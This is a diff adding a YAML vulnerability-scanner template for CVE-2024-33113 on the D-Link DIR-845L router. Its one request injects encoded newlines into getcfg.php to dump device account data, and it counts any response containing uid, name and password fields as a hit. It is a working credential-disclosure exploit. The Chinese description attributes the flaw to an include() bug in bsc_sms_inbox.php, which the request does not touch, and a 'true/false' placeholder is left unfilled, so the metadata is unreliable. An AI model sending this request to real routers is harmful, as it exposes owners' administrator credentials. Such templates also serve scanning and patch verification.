@@ -1,0 +1,35 @@
+id: d-link-dir-845L-bsc_sms_inbox-disclosure
+info:
+  name: D-LINK-DIR-845L 接口 bsc_sms_inbox.php - 信息泄露漏洞
+  author: leadlife
+  severity: high
+  description: CVE-2024-33113 是 D-LINK DIR-845L 路由器中的一个漏洞，允许通过 bsc_sms_inbox.php 文件泄露信息。该漏洞是由于对 include() 函数处理不当而引起的，可以通过操纵 $file 变量来利用该漏洞。这使得攻击者可以包含任意 PHP 脚本并可能检索敏感信息，例如路由器的用户名和密码。
+  reference: 
+    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/D-LINK-DIR-845L%E6%8E%A5%E5%8F%A3bsc_sms_inbox.php%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true/false
+    max-request: 1
+    fofa-query: 
+  tags: d-link,disclosure,router,iot,dlink
+
+
+http:
+  - raw:
+      - |
+        GET /getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid"
+          - "name"
+          - "password"
+          - "group"
+        condition: and
+
+      - type: status
+        status:
+          - 200
